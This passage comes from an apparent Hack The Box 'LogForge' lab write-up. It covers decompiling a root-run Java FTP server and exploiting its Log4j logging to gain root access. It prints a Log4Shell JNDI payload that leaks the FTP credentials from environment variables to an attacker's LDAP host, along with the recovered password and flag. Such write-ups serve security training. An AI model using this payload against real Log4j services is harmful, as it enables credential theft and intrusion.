</span></span></code></pre></div><p>We can recall that port 21 (FTP) was filtered in the output of <code>nmap</code>. In fact, there is an FTP server running on the machine using a custom Java project:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>tomcat@LogForge:/var/lib/tomcat9$ ps -faux
</span></span><span style=display:flex><span>USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>root         757  0.0  0.0   5568  3072 ?        Ss   05:26   0:00 /usr/sbin/cron -f
</span></span><span style=display:flex><span>root         955  0.0  0.0   7248  3372 ?        S    05:27   0:00  \_ /usr/sbin/CRON -f
</span></span><span style=display:flex><span>root         962  0.0  0.0   2608   548 ?        Ss   05:27   0:00      \_ /bin/sh -c /root/run.sh
</span></span><span style=display:flex><span>root         963  0.0  0.0   5648  3096 ?        S    05:27   0:00          \_ /bin/bash /root/run.sh
</span></span><span style=display:flex><span>root         964  0.1  1.7 3576972 70076 ?       Sl   05:27   0:25              \_ java -jar /root/ftpServer-1.0-SNAPSHOT-all.jar
</span></span></code></pre></div><h2 id=exploring-the-ftp-server>Exploring the FTP server</h2><p>Fortunately, the JAR file can be found in the root directory:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>tomcat@LogForge:/var/lib/tomcat9$ ls -la /
</span></span><span style=display:flex><span>total 2060
</span></span><span style=display:flex><span>drwxr-xr-x   1 root root     224 Dec 21 20:09 .
</span></span><span style=display:flex><span>drwxr-xr-x   1 root root     224 Dec 21 20:09 ..
</span></span><span style=display:flex><span>lrwxrwxrwx   1 root root       7 Jul 31  2020 bin -&gt; usr/bin
</span></span><span style=display:flex><span>drwxr-xr-x   1 root root     294 Dec 21 01:21 boot
</span></span><span style=display:flex><span>drwxr-xr-x   1 root root       0 Jul  2 18:33 cdrom
</span></span><span style=display:flex><span>drwxr-xr-x  17 root root    3820 Dec 24 05:26 dev
</span></span><span style=display:flex><span>drwxr-xr-x   1 root root    3176 Dec 21 20:04 etc
</span></span><span style=display:flex><span>-rw-r--r--   1 root root 2048143 Dec 18 11:49 ftpServer-1.0-SNAPSHOT-all.jar
</span></span><span style=display:flex><span>drwxr-xr-x   1 root root       6 Jul  2 18:57 home
</span></span><span style=display:flex><span>lrwxrwxrwx   1 root root       7 Jul 31  2020 lib -&gt; usr/lib
</span></span><span style=display:flex><span>lrwxrwxrwx   1 root root       9 Jul 31  2020 lib32 -&gt; usr/lib32
</span></span><span style=display:flex><span>lrwxrwxrwx   1 root root       9 Jul 31  2020 lib64 -&gt; usr/lib64
</span></span><span style=display:flex><span>lrwxrwxrwx   1 root root      10 Jul 31  2020 libx32 -&gt; usr/libx32
</span></span><span style=display:flex><span>drwxr-xr-x   1 root root       0 Jul 31  2020 media
</span></span><span style=display:flex><span>drwxr-xr-x   1 root root       0 Jul 31  2020 mnt
</span></span><span style=display:flex><span>drwxr-xr-x   1 root root       0 Jul 31  2020 opt
</span></span><span style=display:flex><span>dr-xr-xr-x 287 root root       0 Dec 24 05:26 proc
</span></span><span style=display:flex><span>drwx------   1 root root     236 Dec 21 15:10 root
</span></span><span style=display:flex><span>drwxr-xr-x  25 root root     740 Dec 24 05:26 run
</span></span><span style=display:flex><span>lrwxrwxrwx   1 root root       8 Jul 31  2020 sbin -&gt; usr/sbin
</span></span><span style=display:flex><span>drwxr-xr-x   1 root root       0 Jul 31  2020 srv
</span></span><span style=display:flex><span>dr-xr-xr-x  13 root root       0 Dec 24 05:26 sys
</span></span><span style=display:flex><span>drwxrwxrwt   1 root root      34 Dec 24 05:26 tmp
</span></span><span style=display:flex><span>drwxr-xr-x   1 root root     128 Jul  2 19:17 usr
</span></span><span style=display:flex><span>drwxr-xr-x   1 root root     106 Dec 14 20:31 var
</span></span></code></pre></div><p>We can transfer it to our machine and decompile it using an online tool, such as <a href=http://www.javadecompilers.com>javadecompilers.com</a>.</p><p>There are two main Java files inside the project: <code>Server.java</code> and <code>Worker.java</code>. The second one contains some useful information:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> main.java.com.ippsec.ftpServer<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.logging.log4j.LogManager<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// ..
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>import</span> org.apache.logging.log4j.Logger<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Worker</span> <span style=color:#66d9ef>extends</span> Thread <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// ...
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>Worker</span><span style=color:#f92672>(</span><span style=color:#66d9ef>final</span> Socket client<span style=color:#f92672>,</span> <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>int</span> dataPort<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>debugMode</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>true</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>fileSeparator</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>transferMode</span> <span style=color:#f92672>=</span> transferType<span style=color:#f92672>.</span><span style=color:#a6e22e>ASCII</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>currentUserStatus</span> <span style=color:#f92672>=</span> userStatus<span style=color:#f92672>.</span><span style=color:#a6e22e>NOTLOGGEDIN</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>validUser</span> <span style=color:#f92672>=</span> System<span style=color:#f92672>.</span><span style=color:#a6e22e>getenv</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;ftp_user&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>validPassword</span> <span style=color:#f92672>=</span> System<span style=color:#f92672>.</span><span style=color:#a6e22e>getenv</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;ftp_password&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>quitCommandLoop</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>false</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>controlSocket</span> <span style=color:#f92672>=</span> client<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>dataPort</span> <span style=color:#f92672>=</span> dataPort<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>currDirectory</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/root&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>root</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// ...
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>As it can be seen, valid username and password for FTP are stored in some environment variables called <code>ftp_user</code> and <code>ftp_password</code>. Moreover, the FTP server uses Log4j.</p><p>To obtain the value of these environment variables, we can exploit Log4j JNDI lookups again. Nevertheless, we will not be able to inject a valid serialized object with <a href=https://github.com/pimps/ysoserial-modified>ysoserial-modified</a> because the Java project does not use any package that is vulnerable to insecure deserialization.</p><p>Then, we can only exfiltrate data through LDAP using the previous LDAP server. To obtain the exfiltrated data, we can make use of Wireshark.</p><h2 id=ldap-exfiltration>LDAP exfiltration</h2><p>From the machine, we can connect to the FTP server and inject the JNDI lookup payload while capturing with Wireshark.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>tomcat@LogForge:/var/lib/tomcat9$ cd /tmp
</span></span><span style=display:flex><span>tomcat@LogForge:/tmp$ ftp localhost
</span></span><span style=display:flex><span>Connected to localhost.
</span></span><span style=display:flex><span>220 Welcome to the FTP-Server
</span></span><span style=display:flex><span>Name (localhost:tomcat): ${jndi:ldap://10.10.17.44:1389/${env:ftp_user}:${env:ftp_password}}
</span></span><span style=display:flex><span>530 Not logged in
</span></span><span style=display:flex><span>Login failed.
</span></span></code></pre></div><p>Notice that <code>${env:ftp_user}</code> will print the value of the environment variable called <code>ftp_user</code>.</p><p>The logs of the LDAP server will tell that a connection was received, but no more useful information. In Wireshark we can see the desired information:</p><p><img src=/images/HTB/LogForge/LogForge-ftp-env.png alt=Wireshark></p><p>As shown above, the FTP credentials are: <code>ippsec:log4j_env_leakage</code>. Now we can login successfully:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>ftp&gt; user ippsec
</span></span><span style=display:flex><span>331 User name okay, need password
</span></span><span style=display:flex><span>Password:
</span></span><span style=display:flex><span>230-Welcome to HKUST
</span></span><span style=display:flex><span>230 User logged in successfully
</span></span><span style=display:flex><span>Remote system type is FTP.
</span></span><span style=display:flex><span>ftp&gt; dir
</span></span><span style=display:flex><span>200 Command OK
</span></span><span style=display:flex><span>125 Opening ASCII mode data connection for file list.
</span></span><span style=display:flex><span>.profile
</span></span><span style=display:flex><span>.ssh
</span></span><span style=display:flex><span>snap
</span></span><span style=display:flex><span>ftpServer-1.0-SNAPSHOT-all.jar
</span></span><span style=display:flex><span>.bashrc
</span></span><span style=display:flex><span>.selected_editor
</span></span><span style=display:flex><span>run.sh
</span></span><span style=display:flex><span>.lesshst
</span></span><span style=display:flex><span>.bash_history
</span></span><span style=display:flex><span>root.txt
</span></span><span style=display:flex><span>.viminfo
</span></span><span style=display:flex><span>.cache
</span></span><span style=display:flex><span>226 Transfer complete.
</span></span></code></pre></div><p>At this point, we can download the <code>root.txt</code> flag:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>ftp&gt; get root.txt
</span></span><span style=display:flex><span>local: root.txt remote: root.txt
</span></span><span style=display:flex><span>200 Command OK
</span></span><span style=display:flex><span>150 Opening ASCII mode data connection for requested file root.txt
</span></span><span style=display:flex><span>WARNING! 1 bare linefeeds received in ASCII mode
</span></span><span style=display:flex><span>File may not have transferred correctly.
</span></span><span style=display:flex><span>226 File transfer successful. Closing data connection.
</span></span><span style=display:flex><span>33 bytes received in 0.00 secs (210.6311 kB/s)
</span></span><span style=display:flex><span>ftp&gt; quit
</span></span><span style=display:flex><span>221 Closing connection
</span></span><span style=display:flex><span>tomcat@LogForge:/tmp$ cat root.txt
</span></span><span style=display:flex><span>648bf4d58f9cec00f1720aeb122a4ce0
</span></span></code></pre></div><p>In order to actually get an interactive shell as <code>root</code>, one could add SSH keys to <code>/root/.ssh</code>. However, the Java FTP server does not work properly, so we cannot overwrite files. Furthermore, the <code>id_rsa</code> stored inside <code>/root/.ssh</code> is not working as expected, because it does not login without password.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label=aside class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:5rem><p class="f5 b mb3">Contents of this write-up</p><nav id=TableOfContents><ul><li><a href=#port-scanning>Port scanning</a></li><li><a href=#web-enumeration>Web enumeration</a></li><li><a href=#bypassing-apache-restrictions>Bypassing Apache restrictions</a></li><li><a href=#exploiting-log4j>Exploiting Log4j</a></li><li><a href=#system-enumeration>System enumeration</a></li><li><a href=#exploring-the-ftp-server>Exploring the FTP server</a></li><li><a href=#ldap-exfiltration>LDAP exfiltration</a></li></ul></nav></div></aside></article></main><footer class="bg-black bottom-0 w-100 pa3" role=contentinfo><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a><div style=margin-top:8px><div><div><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel=noopener aria-label="follow on GitHub——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></footer></body></html>